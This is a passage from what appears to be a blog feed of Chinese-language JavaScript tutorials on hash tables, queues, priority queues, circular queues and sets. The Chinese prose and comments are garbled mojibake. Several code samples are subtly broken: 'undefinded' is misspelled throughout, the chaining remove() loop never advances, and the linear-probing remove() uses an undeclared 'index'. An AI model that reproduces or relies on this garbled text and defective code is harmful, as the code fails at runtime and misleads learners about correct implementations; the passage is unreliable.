hash += key.charCodeAt(i);		&#125;		// ç‚ºäº†å–åˆ°è¼ƒå°å€¼ï¼Œä½¿ç”¨ä»»æ„æ•¸åšé™¤æ³• mod è™•ç†		return hash % 37;				&#125;	this.put = function(key, value) &#123;		let position = getHashTableCode(key);		// è‹¥è©²ä½ç½®æ²’æœ‰æ–°å¢éå…ƒç´ ï¼Œè¦å…ˆ init ä¸€å€‹ LinkedList é¡åˆ¥		if(table[position] === undefinded) &#123;			table[position] = new LinkedList();		&#125;		table[position].append(new ValuePair(key, value)); 	&#125;		this.get = function(key) &#123;		let position = getHashTableCode(key);		if(table[position] !== undefinded) &#123;			let current = table[position].getHead();			// ä½¿ç”¨è¿´åœˆå°‹æ‰¾åœ¨ LinkedList ä¸­ç¬¦åˆ key çš„å…ƒç´ 			while(current.next) &#123;				if(current.element.key === key) &#123;					return current.element.value;				&#125; 				current = current.next;			&#125;			// è‹¥æ˜¯è¦æ‰¾çš„æ˜¯ç¬¬ä¸€å€‹æˆ–æ˜¯æœ€å¾Œä¸€å€‹ç¯€é»çš„æƒ…æ³å°±ä¸æœƒé€²å…¥ while è¿´åœˆï¼Œè¦åœ¨é€™è£¡è™•ç†			if(current.element.key === key) &#123;				return current.element.value;			&#125;		&#125; 		return undefinded;	&#125;	// èˆ‡ä¸€èˆ¬é›œæ¹Šè¡¨ä¸åŒï¼Œæˆ‘å€‘è¦ç§»é™¤çš„æ˜¯éˆçµä¸²åˆ—çš„å…ƒç´ 	this.remove = function(key) &#123;		let position = getHashTableCode(key);		// åˆ¤æ–·è©²ä½ç½®æ˜¯å¦æœ‰å…ƒç´ 		if(table[position] !== undefinded) &#123;			let current = table[position].getHead();			while(current.next) &#123;				// ç•¶ key ç›¸åŒæ™‚ä½¿ç”¨ LinkedList çš„ remove ç§»é™¤å…ƒç´  						if(current.element.key === key) &#123;					table[position].remove(current.element);					// è‹¥æ˜¯æ•´å€‹ä½ç½®çš„ LinkedList ç‚ºç©ºå‰‡å°‡è©²ä½ç½®çµ¦å®š undefinded					if(table[position].isEmpty()) &#123;						table[position] = undefinded;					&#125;					// è‹¥æˆåŠŸç§»é™¤å‰‡å›å‚³ true					return true;				&#125;			&#125;			current = current.next;		&#125;		// è‹¥æ˜¯è¦æ‰¾çš„æ˜¯ç¬¬ä¸€å€‹æˆ–æ˜¯æœ€å¾Œä¸€å€‹ç¯€é»çš„æƒ…æ³å°±ä¸æœƒé€²å…¥ while è¿´åœˆï¼Œè¦åœ¨é€™è£¡è™•ç†		if(current.element.key === key) &#123;			table[position].remove(current.element);			if(table[position].isEmpty()) &#123;					table[position] = undefinded;			&#125;		&#125;	&#125;	return false;&#125;	


ç·šæ€§æ¢æŸ¥ï¼šæ˜¯å¦å¤–ä¸€ç¨®è§£æ±ºé›œæ¹Šè¡¨ï¼Œè‹¥æ˜¯æ¬²åŠ å…¥ Hash Table ä½ç½®å·²ç¶“è¢«ä½”æ“šå‰‡å¾€ä¸‹ä¸€å€‹ index + 1 å»å¡«ï¼Œè‹¥é‚„æ˜¯è¢«ä½”æ“šå‰‡è€ƒæ…® index + 2ï¼Œä»¥æ­¤é¡æ¨ã€‚

 
 æ›´æ–°éå¾Œçš„ HashTableï¼š
 function HashTable() &#123;	let table = [];	// å¯¦ä½œå…§éƒ¨ä¸€å€‹ ValuePair é¡åˆ¥ï¼Œå­˜åŸå§‹ keyã€value			let ValuePair = function(key, value) &#123;		this.key = key;		this.value = value;	&#125;	let getHashTableCode = function(key) &#123;		let hash = 0;		for(let i = 0; i &lt; key.length; i++) &#123;			// charCodeAt æœƒå›å‚³æŒ‡å®šå­—ä¸²å…§å­—å…ƒçš„ Unicode ç·¨ç¢¼ï¼ˆå¯ä»¥åŒ…å«ä¸­æ–‡å­—ï¼‰			hash += key.charCodeAt(i);		&#125;		// ç‚ºäº†å–åˆ°è¼ƒå°å€¼ï¼Œä½¿ç”¨ä»»æ„æ•¸åšé™¤æ³• mod è™•ç†		return hash % 37;				&#125;	// ç”±æ–¼ JavaScript é™£åˆ—å¯å‹•æ…‹å¢åŠ é•·åº¦ï¼Œæ‰€ä»¥ä¸ç”¨æ“”å¿ƒé•·åº¦ä¸å¤ å•é¡Œ	this.put = function(key, value) &#123;		let position = getHashTableCode(key);		// è‹¥æ˜¯ä½ç½®æ²’è¢«ä½”æ“šç›´æ¥ new ä¸€å€‹ ValuePairï¼Œè‹¥æœ‰å‰‡è€ƒæ…®ä¸‹ä¸€å€‹ index		if(table[position] === undefinded) &#123;			table[position] = new ValuePair(key, value);		&#125; else &#123;			let index = ++position;			while(table[index] !== undefinded) &#123;				index++;			&#125;			table[index] = new ValuePair(key, value);		&#125;	&#125;	this.get = function(key) &#123;		let position = getHashTableCode(key);		// å…ˆç¢ºèªéµå€¼æ˜¯å¦å­˜åœ¨		if(table[position] !== undefinded) &#123;			// é–‹å§‹æ¯”å°ï¼Œæ²’æœ‰å°±ä¸‹ä¸€å€‹			if(table[position].key === key) &#123;				return table[position].value;			&#125; else &#123;				let index = ++position;				while(table[index] === undefinded || table[index].key !== key) &#123;					index++;				&#125;				if(table[index].key === key) &#123;					return table[index].value;				&#125;			&#125;		&#125;		return undefinded;	&#125;	this.remove = function(key) &#123;		let position = getHashTableCode(key);		// å…ˆç¢ºèªéµå€¼æ˜¯å¦å­˜åœ¨		if(table[position] !== undefinded) &#123;			// é–‹å§‹æ¯”å°ï¼Œæ²’æœ‰å°±ä¸‹ä¸€å€‹			if(table[position].key === key) &#123;				table[index] = undefinded;			&#125; else &#123;				let index = ++position;				while(table[index] === undefinded || table[index].key !== key) &#123;					index++;				&#125;				if(table[index].key === key) &#123;					table[index] = undefinded;				&#125;			&#125;		&#125;		return undefinded;	&#125;&#125;			

æ›´å¥½çš„é›œæ¹Šè¡¨ï¼ˆHash Functionï¼‰ï¼šä¿—è©±èªªé é˜²å‹æ–¼æ²»ç™‚ï¼Œè‹¥æ˜¯èƒ½ä½¿ç”¨æ›´å¥½çš„ Hash Function å°±èƒ½é å…ˆé¿å…è¡çªï¼ˆcollisionï¼‰çš„å¯èƒ½ï¼ˆæ“æœ‰è¼ƒä½æ’å…¥å’Œæª¢ç´¢å…ƒç´ çš„æ™‚é–“ã€è¼ƒä½è¡çªçš„å¯èƒ½æ„å‘³è‘—æ›´å¥½çš„é›œæ¹Šè¡¨ï¼‰ã€‚

 // djb2HashCode å¯¦ä½œlet djb2HashCode = function(key) &#123;	// åˆå§‹åŒ– hash å€¼ï¼Œå¤§éƒ¨åˆ†å¯¦ä½œä½¿ç”¨ 5381	let hash = 5381;	for(let i = 0; i &lt; key.length; i++) &#123;		// æ ¹æ“šç¶“é©—å€¼çµ¦å€‹é­”è¡“æ•¸å­— 33		hash = hash * 33 + key.charCodeAt(i);	&#125;	// 1013 ç‚ºéš¨æ©Ÿè³ªæ•¸	return hash % 1013;&#125;		

ç¸½çµåœ¨é€™å€‹å–®å…ƒä¸­æˆ‘å€‘å­¸åˆ°äº†ï¼š

ä»€éº¼æ˜¯å­—å…¸ï¼ˆDictionaryï¼‰ï¼Ÿå¦‚ä½•ä½¿ç”¨ï¼Ÿ
ä»€éº¼æ˜¯é›œæ¹Šè¡¨ï¼ˆHash Tableï¼‰ï¼Ÿå¦‚ä½•å¯¦ä½œï¼Ÿ
è™•ç†é›œæ¹Šè¡¨è¡çª

å»¶ä¼¸é–±è®€
å­—ç¬¦ç¼–ç ç¬”è®°ï¼šASCIIï¼ŒUnicodeå’ŒUTF-8

ï¼ˆimage via algolistã€mcgillã€mindcrackerincã€hwsã€cecilsunkureï¼‰
é—œæ–¼ä½œè€…ï¼š@kdchang æ–‡è—å‹é–‹ç™¼è€…ï¼Œå¤¢æƒ³æ˜¯åšå‡ºäººå€‘æƒ³ç”¨çš„ç”¢å“å’Œè¾¦ä¸€æ‰€å¿ƒç›®ä¸­ç†æƒ³çš„å­¸æ ¡ã€‚A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>JavaScript</tag>
        <tag>Algorithm</tag>
        <tag>æ¼”ç®—æ³•</tag>
        <tag>ECMAScript2015</tag>
        <tag>ES6</tag>
        <tag>Data Structure</tag>
        <tag>è³‡æ–™çµæ§‹</tag>
        <tag>é™£åˆ—</tag>
        <tag>Dictionary</tag>
        <tag>Hash Table</tag>
        <tag>é›œæ¹Šè¡¨</tag>
        <tag>å­—å…¸</tag>
      </tags>
  </entry>
  <entry>
    <title>ç”¨ JavaScript å­¸ç¿’è³‡æ–™çµæ§‹å’Œæ¼”ç®—æ³•ï¼šä½‡åˆ—ï¼ˆQueueï¼‰ç¯‡</title>
    <url>/2016/12/10/javascript-data-structure-algorithm-queue/</url>
    <content><![CDATA[
ä»€éº¼æ˜¯ä½‡åˆ—ï¼ˆQueueï¼‰ï¼Ÿä½‡åˆ—ï¼ˆQueueï¼‰æ˜¯ä¸€ç¨®å…ˆé€²å…ˆå‡ºï¼ˆFirst In First Out, FIFOï¼‰çš„æœ‰åºä¸²åˆ—ï¼ˆOrdered Listï¼‰ï¼Œèˆ‡å †ç–Šï¼ˆStackï¼‰å¾Œé€²å…ˆå‡ºï¼ˆLast In First Out, LIFOï¼‰ä¸åŒçš„æ˜¯ä½‡åˆ—ï¼ˆQueueï¼‰çš„æ–°å¢å’Œåˆªé™¤å…ƒç´ æ˜¯ç™¼ç”Ÿåœ¨ä¸åŒç«¯ï¼Œæ–°å¢å…ƒç´ åœ¨å°¾éƒ¨ã€ç§»é™¤å…ƒç´ åœ¨é ‚éƒ¨ï¼Œæœ€æ–°åŠ å…¥çš„å…ƒç´ æœƒå¾å°¾éƒ¨æ’å…¥ã€‚åœ¨ä¸€èˆ¬ç”Ÿæ´»ä¸­æ¯”è¼ƒå¸¸è¦‹çš„ä¾‹å­æ˜¯é›»å½±é™¢æ’éšŠè²·ç¥¨ã€å°ä¸ƒä¾¿åˆ©å•†åº—æ’éšŠä»˜æ¬¾ï¼ˆç•¶ç„¶ä¸èƒ½æœ‰äººæƒ³æ’éšŠå•¦ï¼‰ï¼Œåœ¨è¨ˆç®—æ©Ÿç§‘å­¸é ˜åŸŸä½‡åˆ—ï¼ˆQueueï¼‰æ‡‰ç”¨ä¹Ÿååˆ†å¸¸è¦‹ï¼Œåƒæ˜¯å°è¡¨æ©Ÿåˆ—å°é †åºæ’ç¨‹ï¼ˆç•¶æˆ‘å€‘é»é¸åˆ—å°éµæ™‚ï¼Œç¬¬ä¸€å€‹åˆ—å°æ–‡ä»¶æœƒå…ˆè¢«åˆ—å°ï¼Œå¾ŒçºŒé€ä¾†çš„æ–‡ä»¶æœƒä¾åºåˆ—å°ï¼‰æˆ–æ˜¯ä¸€èˆ¬ä½œæ¥­ç³»çµ±çš„å·¥ä½œä½‡åˆ—ï¼ˆjob queueï¼‰ã€I&#x2F;O Buffer ç·©è¡å€ï¼Œä¹Ÿæ˜¯é€éå…ˆé€²å…ˆå‡ºä¾†è™•ç†ã€‚
ä»¥ä¸‹æ˜¯ä½‡åˆ—ï¼ˆQueueï¼‰å¹¾å€‹ç‰¹æ€§ï¼š

ä½‡åˆ—ï¼ˆQueueï¼‰æ˜¯ä¸€çµ„ç›¸åŒæ€§è³ªçš„å…ƒç´ çµ„åˆ
å…·æœ‰å…ˆé€²å…ˆå‡ºï¼ˆFirst In, First Out, FIFOï¼‰ç‰¹æ€§
æ–°å¢å…ƒç´ æ™‚ç™¼ç”Ÿåœ¨ Rear å¾Œç«¯
åˆªé™¤å…ƒç´ æ™‚ç™¼ç”Ÿåœ¨ Front å‰ç«¯ 
æ–°å¢&#x2F;åˆªé™¤ï¼ˆEnqueue&#x2F;Dequeue æˆ– Add&#x2F;Deleteï¼‰å…ƒç´ æ˜¯ç™¼ç”Ÿåœ¨ä¸åŒç«¯

ç”¨é™£åˆ—ï¼ˆArrayï¼‰å¯¦ä½œä½‡åˆ—ï¼ˆQueueï¼‰æ¥ä¸‹ä¾†æˆ‘å€‘å°‡ä½¿ç”¨ JavaScript çš„ä¸€ç¶­é™£åˆ—ä¾†å¯¦ä½œä½‡åˆ—ï¼ˆQueueï¼‰ï¼Œå…¶åŸºæœ¬æ­¥é©Ÿå¦‚ä¸‹ï¼š

å®£å‘Šä½‡åˆ—é¡åˆ¥
 function Queue() &#123;	// é€™è£¡å°‡æ”¾ç½®ä½‡åˆ—çš„å±¬æ€§å’Œæ–¹æ³•&#125;

å®£å‘Šä¸€å€‹ä¸€ç¶­é™£åˆ—ï¼ˆArrayï¼‰
 é¦–å…ˆæˆ‘å€‘ä½¿ç”¨ä¸€å€‹ä¸€ç¶­é™£åˆ—ï¼ˆArrayï¼‰ç•¶åšå„²å­˜ä½‡åˆ—å…ƒç´ çš„è³‡æ–™çµæ§‹ï¼Œé€™éƒ¨ä»½å’Œæˆ‘å€‘ä¹‹å‰æåˆ°çš„å †ç–Šï¼ˆStackï¼‰é¡ä¼¼ï¼Œåªæ˜¯åœ¨ä½‡åˆ—æ–°å¢åˆªé™¤å…ƒç´ æ™‚æ˜¯åœ¨ä¸åŒç«¯é»é€²è¡Œï¼ˆé€™é‚Šä½¿ç”¨ let è®“ scope ç¶­æŒåœ¨ function ä¸­ï¼‰ï¼š
 function Queue() &#123;	let items = [];&#125;

å»ºç«‹ä½‡åˆ—å¯ç”¨æ–¹æ³•ï¼ˆmethodï¼‰

enqueue(element)ï¼šæ–¼ä½‡åˆ—å°¾ç«¯æ–°å¢ä¸€å€‹æˆ–å¤šå€‹å…ƒç´ 

 this.enqueue = function(element) &#123;	items.push(element);&#125;;	


dequeue()ï¼šåˆªé™¤ä½‡åˆ—ç¬¬ä¸€å€‹ï¼ˆé ­éƒ¨ï¼‰çš„å…ƒç´ ï¼Œä¸¦å›å‚³è¢«ç§»é™¤çš„å…ƒç´ ï¼ˆåœ¨ 	JavaScript ä¸­ shift() ç”¨æ–¼ç§»é™¤é™£åˆ—ç¬¬ä¸€å€‹å…ƒç´  items[0]ï¼Œä¹Ÿå°±æ˜¯é ­éƒ¨ï¼‰

 this.dequeue = function() &#123;	return items.shift();&#125;


front()ï¼šå›å‚³ä½‡åˆ—ä¸­ç¬¬ä¸€å€‹å…ƒç´ ï¼Œä½†ä½‡åˆ—æœ¬èº«ä¸ä½œä»»ä½•æ›´å‹•

 this.front = function() &#123;	return items[0];&#125;


isEmpty()ï¼šå¦‚æœä½‡åˆ—ä¸­ä¸åŒ…å«ä»»ä½•å…ƒç´ ï¼Œå‰‡å›å‚³ trueï¼Œåä¹‹å›å‚³ false

 this.isEmpty = function() &#123;	return items.length === 0;&#125;


size()ï¼šå›å‚³ä½‡åˆ—æ‰€åŒ…å«çš„å…ƒç´ å€‹æ•¸ï¼Œå³ç‚ºå›å‚³é™£åˆ—çš„ length

 this.size = function() &#123;	return items.length;&#125;

å®Œæ•´ä½‡åˆ—ï¼ˆQueueï¼‰é¡åˆ¥ï¼šfunction Queue() &#123;	let items = [];	this.enqueue = function(element) &#123;		items.push(element);	&#125;;	this.dequeue = function() &#123;		return items.shift();	&#125;;	this.front = function() &#123;		return items[0];	&#125;;	this.isEmpty = function() &#123;		return items.length === 0;	&#125;;	this.clear = function() &#123;		items = [];	&#125;;	this.size = function() &#123;		return items.length;	&#125;;	this.print = function() &#123;		// åˆ—å°å‡ºä½‡åˆ—å…§å®¹		console.log(items.toString());	&#125;&#125;

ä½¿ç”¨ Queue é¡åˆ¥// ç”±æ–¼ä¸Šé¢æˆ‘å€‘å·²ç¶“å»ºç«‹å¥½äº† Queue çš„é¡åˆ¥ï¼Œæˆ‘å€‘é€™é‚Šç›´æ¥ä½¿ç”¨ã€‚äº¦å¯ä»¥ç€è¦½å™¨ console ç›´æ¥çœ‹çµæœconst queue = new Queue();// åˆ¤æ–·ä½‡åˆ—æ˜¯å¦ç‚ºç©ºconsole.log(queue.isEmpty());// å°‡å€¼æ”¾å…¥ä½‡åˆ—ä¸­queue.enqueue(&#x27;ä»¤ç‹è¡&#x27;);queue.enqueue(&#x27;è¥¿æ–¹ä¸æ‹œ&#x27;);queue.enqueue(&#x27;ç”°è–„å…‰&#x27;);queue.enqueue(&#x27;ä»»è´è´&#x27;);// å›å‚³ä½‡åˆ—é¦–ä½console.log(queue.front());// å›å‚³ä½‡åˆ—é•·åº¦console.log(queue.size());// åˆ—å°å‡ºä½‡åˆ—å…§å®¹ï¼šä»¤ç‹è¡,è¥¿æ–¹ä¸æ‹œ,ç”°è–„å…‰,ä»»è´è´queue.print();// ç§»é™¤ä½‡åˆ—é¦–ä½queue.dequeue();// å›å‚³ä½‡åˆ—é¦–ä½console.log(queue.front());// å›å‚³ä½‡åˆ—é•·åº¦console.log(queue.size());// åˆ—å°å‡ºä½‡åˆ—å…§å®¹ï¼šè¥¿æ–¹ä¸æ‹œ,ç”°è–„å…‰,ä»»è´è´queue.print();

å„ªå…ˆç´šä½‡åˆ—ï¼ˆPriority Queueï¼‰å„ªå…ˆç´šä½‡åˆ—ï¼ˆPriority Queueï¼‰æ˜¯ä¸€èˆ¬ä½‡åˆ—çš„ä¿®æ”¹ç‰ˆæœ¬ï¼Œç‚ºä¸€ç¨®ä¸å¿…éµå®ˆä½‡åˆ—ç‰¹æ€§ï¼FIFO(å…ˆé€²å…ˆå‡º)çš„æœ‰åºä¸²åˆ—ã€‚å…¶è¦å®šæ¯å€‹å…ƒç´ éƒ½è¦æœ‰å„ªå…ˆç´šï¼Œå„ªå…ˆç´šæœ€é«˜çš„æœƒæœ€æ—©ç²å¾—æœå‹™ï¼Œè‹¥æ˜¯å„ªå…ˆç´šç›¸åŒå‰‡çœ‹æ’åˆ—é †åºã€‚å„ªå…ˆä½‡åˆ—å¯ä»¥åˆ©ç”¨é™£åˆ—çµæ§‹åŠéˆçµä¸²åˆ—ä¾†å¯¦ä½œã€‚åœ¨ç”Ÿæ´»ä¸­æˆ‘å€‘ä¹Ÿå¯ä»¥çœ‹åˆ°å„ªå…ˆç´šä½‡åˆ—ï¼ˆPriority Queueï¼‰çš„çœŸå¯¦æ‡‰ç”¨ï¼Œä¾‹å¦‚ï¼šVIP æœƒå“¡å¯ä»¥å„ªå…ˆæ’éšŠé€²å ´ã€é“è·¯è¡Œé§›æ™‚æ•‘è­·è»Šå„ªå…ˆæ–¼å…¶ä»–è»Šè¼›ï¼Œç”šè‡³æ˜¯æ€¥æ•‘æ™‚ä¹Ÿæœƒæœ‰ç—…æƒ…åš´é‡åˆ†é¡ã€‚æ–¼è¨ˆç®—æ©Ÿç§‘å­¸é ˜åŸŸä¸­ï¼ŒCPU å·¥ä½œæ’ç¨‹ä¹Ÿå¸¸æœƒç”¨åˆ°å„ªå…ˆä½‡åˆ—ã€‚
å»ºç«‹å„ªå…ˆç´šä½‡åˆ—ï¼ˆPriority Queueï¼‰é¡åˆ¥function PriorityQueue() &#123;	let items = [];	function QueueElement(element, priority) &#123;		this.element = element;		this.priority = priority;	&#125;	this.enqueue = function(element, priority) &#123;		const queueElement = new QueueElement(element, priority);		if(this.isEmpty()) &#123;			items.push(queueElement);		&#125; else &#123;			let added = false;			for(let i = 0; i &lt; items.length; i++) &#123;				if(queueElement.priority &lt; items[i].priority) &#123;					items.splice(i, 0, queueElement);                  	added = true;                  	break;				&#125;			&#125;			if(!added) &#123;				items.push(queueElement);			&#125;					&#125;	&#125;	this.dequeue = function() &#123;		return items.shift();	&#125;;	this.front = function() &#123;		return items[0];	&#125;;	this.isEmpty = function() &#123;		return items.length === 0;	&#125;;	this.clear = function() &#123;		items = [];	&#125;;	this.size = function() &#123;		return items.length;	&#125;;	this.print = function() &#123;		// å› ç‚ºæ˜¯ç‰©ä»¶ï¼Œæ‰€ä»¥ä½¿ç”¨ JSON.stringify() åˆ—å°å‡ºä½‡åˆ—å…§å®¹		console.log(JSON.stringify(items));	&#125;&#125;

ä½¿ç”¨å„ªå…ˆç´šä½‡åˆ—ï¼ˆPriority Queueï¼‰é¡åˆ¥// ç”±æ–¼ä¸Šé¢æˆ‘å€‘å·²ç¶“å»ºç«‹å¥½äº† PriorityQueue çš„é¡åˆ¥ï¼Œæˆ‘å€‘é€™é‚Šç›´æ¥ä½¿ç”¨ã€‚äº¦å¯ä»¥ç€è¦½å™¨ console ç›´æ¥çœ‹çµæœconst priorityQueue = new PriorityQueue();// åˆ¤æ–·ä½‡åˆ—æ˜¯å¦ç‚ºç©ºconsole.log(priorityQueue.isEmpty());// å°‡å€¼å’Œå„ªå…ˆåºæ”¾å…¥ä½‡åˆ—ä¸­priorityQueue.enqueue(&#x27;ä»¤ç‹è¡&#x27;, 2);priorityQueue.enqueue(&#x27;è¥¿æ–¹ä¸æ‹œ&#x27;, 1);priorityQueue.enqueue(&#x27;ç”°è–„å…‰&#x27;, 4);priorityQueue.enqueue(&#x27;ä»»è´è´&#x27;, 3);// å›å‚³ä½‡åˆ—å„ªå…ˆåºé¦–ä½ QueueElement &#123;element: &quot;è¥¿æ–¹ä¸æ‹œ&quot;, priority: 1&#125;console.log(priorityQueue.front());// å›å‚³ä½‡åˆ—é•·åº¦console.log(priorityQueue.size());// åˆ—å°å‡ºä½‡åˆ—å…§å®¹ï¼š[&#123;&quot;element&quot;:&quot;è¥¿æ–¹ä¸æ‹œ&quot;,&quot;priority&quot;:1&#125;,&#123;&quot;element&quot;:&quot;ä»¤ç‹è¡&quot;,&quot;priority&quot;:2&#125;,&#123;&quot;element&quot;:&quot;ä»»è´è´&quot;,&quot;priority&quot;:3&#125;,&#123;&quot;element&quot;:&quot;ç”°è–„å…‰&quot;,&quot;priority&quot;:4&#125;]priorityQueue.print();// ç§»é™¤ä½‡åˆ—é¦–ä½è¥¿æ–¹ä¸æ‹œpriorityQueue.dequeue();// å›å‚³ä½‡åˆ—é¦–ä½ QueueElement &#123;element: &quot;ä»¤ç‹è¡&quot;, priority: 2&#125;console.log(priorityQueue.front());// å›å‚³ä½‡åˆ—é•·åº¦console.log(priorityQueue.size());// åˆ—å°å‡ºä½‡åˆ—å…§å®¹ï¼š[&#123;&quot;element&quot;:&quot;ä»¤ç‹è¡&quot;,&quot;priority&quot;:2&#125;,&#123;&quot;element&quot;:&quot;ä»»è´è´&quot;,&quot;priority&quot;:3&#125;,&#123;&quot;element&quot;:&quot;ç”°è–„å…‰&quot;,&quot;priority&quot;:4&#125;]priorityQueue.print();

ç’°ç‹€ä½‡åˆ—ï¼ˆCircular Queueï¼‰ç’°ç‹€ä½‡åˆ—ï¼ˆCircular Queueï¼‰æ˜¯æŒ‡ä¸€ç¨®ç’°å½¢çµæ§‹çš„ä½‡åˆ—ï¼Œå®ƒæ˜¯åˆ©ç”¨ä¸€ç¨® Q[0: N-1] çš„ä¸€ç¶­é™£åˆ—ï¼ŒåŒæ™‚ Q[0] ç‚º Q[N-1] çš„ä¸‹ä¸€å€‹å…ƒç´ ã€‚ç”±æ–¼ä¸€èˆ¬ä½‡åˆ—æœƒé‡åˆ°æ˜æ˜å‰ç«¯é ­éƒ¨å°šæœ‰ç©ºé–“ï¼Œä½†å†åŠ å…¥å…ƒç´ æ™‚å»ç™¼ç¾æ­¤ä½‡åˆ—å·²æ»¿ã€‚æ­¤æ™‚çš„è§£æ±ºæ–¹æ³•å°±æ˜¯ä½¿ç”¨ç’°å½¢ä½‡åˆ—ï¼ˆCircular Queueï¼‰ã€‚
ç’°ç‹€ä½‡åˆ—ï¼ˆCircular Queueï¼‰ç‰¹æ€§å¦‚ä¸‹ï¼š

ç’°ç‹€ä½‡åˆ—æ˜¯ä¸€ç¨®ç’°å½¢çµæ§‹çš„ä½‡åˆ—
ç’°ç‹€ä½‡åˆ—æœ€å¤šä½¿ç”¨ï¼ˆN-1ï¼‰å€‹ç©ºé–“
æŒ‡æ¨™ Front æ°¸é ä»¥é€†æ™‚é˜æ–¹å‘æŒ‡å‘ä½‡åˆ—å‰ç«¯å…ƒç´ çš„å‰ä¸€å€‹ä½ç½® Q[N]
æŒ‡æ¨™ Rear å‰‡æŒ‡å‘ä½‡åˆ—å°¾ç«¯çš„å…ƒç´ 

è‹¥å†åŠ å…¥ä¸€å€‹é …ç›®æ™‚ï¼ŒRear ç­‰æ–¼ 0ï¼Œä¹Ÿå°±æ˜¯ Front ç­‰æ–¼ Rearï¼Œå¦‚æ­¤ç„¡æ³•åˆ†è¾¨æ­¤æ™‚ä½‡åˆ—æ˜¯ç©ºçš„é‚„æ˜¯æ»¿çš„ã€‚å› æ­¤ï¼Œç’°å½¢ä½‡åˆ—å¿…é ˆæµªè²»ä¸€å€‹ç©ºæ ¼ã€‚ç•¶ Front ç­‰æ–¼ Rear æ™‚ï¼Œç’°å½¢ä½‡åˆ—ç‚ºç©ºçš„ã€‚ç•¶ï¼ˆRear+1ï¼‰Mod N ç­‰æ–¼ Front æ™‚ï¼Œç’°å½¢ä½‡åˆ—ç‚ºå·²æ»¿ï¼Œé€šå¸¸ç’°ç‹€ä½‡åˆ—æœ€å¤šä½¿ç”¨ï¼ˆN-1ï¼‰å€‹ç©ºé–“ã€‚
ç¸½çµåœ¨é€™ç« æˆ‘å€‘å­¸åˆ°äº†ï¼š

ä»€éº¼æ˜¯ä½‡åˆ—ï¼ˆQueueï¼‰ï¼Ÿå®ƒå’Œå †ç–Šï¼ˆStackï¼‰æœ‰ä»€éº¼å·®åˆ¥ï¼Ÿ
å¦‚ä½•ä½¿ç”¨ JavaScript å»ºç«‹ Queue é¡åˆ¥ï¼Ÿ
å„ªå…ˆç´šä½‡åˆ—ï¼ˆpriority queueï¼‰æ˜¯ä»€éº¼ï¼Ÿæœ‰ä½•ç‰¹æ€§ï¼Ÿ
ç’°ç‹€ä½‡åˆ—ï¼ˆcircular queueï¼‰æ˜¯ä»€éº¼ï¼Ÿæœ‰ä½•ç‰¹æ€§ï¼Ÿ

äº‹å¯¦ä¸Šï¼Œé™¤äº†ä¸Šè¿°ä»‹ç´¹çš„ä¸€èˆ¬ä½‡åˆ—ã€å„ªå…ˆç´šä½‡åˆ—å’Œç’°ç‹€ä½‡åˆ—å¤–ï¼Œé‚„æœ‰é›™å‘ä½‡åˆ—ï¼ˆä¸åƒå †ç–Šçš„ LIFO æˆ–ä½‡åˆ—çš„ FIFOï¼Œå…¶å…è¨±åœ¨å…©ç«¯éƒ½å¯ä»¥æ–°å¢åˆªé™¤å…ƒç´ ï¼‰ç­‰ç‰¹æ®Šä½‡åˆ—ã€‚è‹¥æ˜¯å°æ–¼ä½‡åˆ—ï¼ˆQueueï¼‰æŒæ¡åº¦é‚„ä¸å¤ çš„è®€è€…ä¸å¦¨ç”¨ç”Ÿæ´»çš„æƒ…å¢ƒé€²è¡Œè¯æƒ³ï¼Œæƒ³æƒ³ä½ å¹³å¸¸åœ¨é›»å½±é™¢æˆ–æ˜¯å¤§è³£å ´è²·æ±è¥¿æ’éšŠçµå¸³çš„æƒ…æ™¯ï¼Œæœƒæ›´å®¹æ˜“å¹«åŠ©ç†è§£å–”ï¼
å»¶ä¼¸é–±è®€
[Algorithm][C &#x2F; C++] ä½‡åˆ—(Queue)ã€ç’°ç‹€ä½‡åˆ—(Circular Queue)
ä½‡åˆ—(Queue)
[ è³‡æ–™çµæ§‹ å°å­¸å ‚ ] ä½‡åˆ— : ä½‡åˆ—çš„æ‡‰ç”¨ (ç’°ç‹€ä½‡åˆ—)
è³‡æ–™çµæ§‹ç¬¬4-7ç« è£œå……æ•™æ

(image via stack-machineã€wikipedia)
é—œæ–¼ä½œè€…ï¼š@kdchang æ–‡è—å‹é–‹ç™¼è€…ï¼Œå¤¢æƒ³æ˜¯åšå‡ºäººå€‘æƒ³ç”¨çš„ç”¢å“å’Œè¾¦ä¸€æ‰€å¿ƒç›®ä¸­ç†æƒ³çš„å­¸æ ¡ã€‚A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>JavaScript</tag>
        <tag>Algorithm</tag>
        <tag>æ¼”ç®—æ³•</tag>
        <tag>ECMAScript2015</tag>
        <tag>ES6</tag>
        <tag>Data Structure</tag>
        <tag>Queue</tag>
        <tag>è³‡æ–™çµæ§‹</tag>
        <tag>é™£åˆ—</tag>
        <tag>Dictionary</tag>
        <tag>Hash Table</tag>
        <tag>é›œæ¹Šè¡¨</tag>
        <tag>å­—å…¸</tag>
        <tag>ä½‡åˆ—</tag>
      </tags>
  </entry>
  <entry>
    <title>ç”¨ JavaScript å­¸ç¿’è³‡æ–™çµæ§‹å’Œæ¼”ç®—æ³•ï¼šé›†åˆï¼ˆSetï¼‰ç¯‡</title>
    <url>/2017/02/11/javascript-data-structure-algorithm-set/</url>
    <content><![CDATA[
ä»€éº¼æ˜¯é›†åˆï¼ˆSetï¼‰ï¼Ÿé›†åˆæ˜¯ä¸€å€‹æºè‡ªæ–¼æ•¸å­¸ç†è«–ä¸­æ“æœ‰ä¸åŒå…ƒç´ çš„é›†åˆï¼š
N &#x3D; {0, 1, 2, 3, 4, 5, 6, â€¦}
ç©ºé›†åˆï¼š{}
å…¶ç‰¹æ€§åœ¨æ–¼å®ƒæ˜¯ç”±ä¸€çµ„ç„¡åºä¸”ä¸é‡è¤‡çš„é …ç›®çµ„æˆã€‚ä½ ä¹Ÿå¯ä»¥æƒ³æˆæ˜¯ä¸€å€‹æ²’æœ‰é‡è¤‡å…ƒç´ å’Œç„¡é †åºçš„é™£åˆ—ã€‚åœ¨é€™ç¯‡æ–‡ç« æˆ‘å€‘æœƒä»‹ç´¹å¦‚ä½•å¯¦ä½œé›†åˆè³‡æ–™çµæ§‹ä¸¦ä½¿ç”¨ äº¤é›†ã€è¯é›†ã€å·®é›†ç­‰é›†åˆæ“ä½œæ–¹å¼ã€‚
